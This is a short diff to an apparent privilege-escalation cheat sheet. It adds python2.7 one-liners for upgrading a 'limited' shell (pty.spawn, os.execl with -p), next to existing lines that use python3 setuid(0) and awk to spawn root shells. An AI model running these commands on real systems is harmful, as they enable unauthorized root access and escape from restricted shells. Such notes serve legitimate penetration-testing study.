@@ -30,6 +30,13 @@ Perfect candidates are:
     python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
     ```
 
+    when you have a `limited` shell:
+    ```
+    export TERM=xterm
+    python2.7 -c 'import pty; pty.spawn("/bin/bash")'
+    python2.7 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
+    ```
+
 - /usr/bin/awk
     ```
     awk 'BEGIN {system("/bin/sh")}'
